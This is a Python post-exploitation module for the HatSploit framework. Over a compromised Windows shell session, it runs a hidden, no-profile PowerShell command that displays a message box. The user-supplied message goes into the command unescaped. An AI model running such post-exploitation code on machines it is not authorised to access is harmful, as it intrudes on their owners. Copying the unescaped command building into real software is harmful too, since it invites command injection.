#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.com
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.lib.sessions import Sessions


class HatSploitModule(Module, Sessions):
    details = {
        'Category': "post",
        'Name': "Windows Invoke Message Box",
        'Module': "post/windows/shell/message_box",
        'Authors': ['Ivan Nikolsky (enty8080) - module developer'],
        'Description': "Invoke message box on Windows machine.",
        'Platform': "windows",
        'Rank': "medium",
    }

    options = {
        'SESSION': {
            'Description': "Session to run on.",
            'Value': None,
            'Type': {'session': {'Platforms': ['windows'], 'Type': 'shell'}},
            'Required': True,
        },
        'MESSAGE': {
            'Description': "Message to show.",
            'Value': "Hello, Friend!",
            'Type': None,
            'Required': True,
        },
    }

    def run(self):
        session, message = self.parse_options(self.options)
        session = self.get_session(session)

        source = (
            "[reflection.assembly]::loadwithpartialname('system.windows.forms');"
            f"[system.Windows.Forms.MessageBox]::show('{message}')"
        )

        if session:
            session.send_command(f"powershell -w hidden -nop -c {source}")
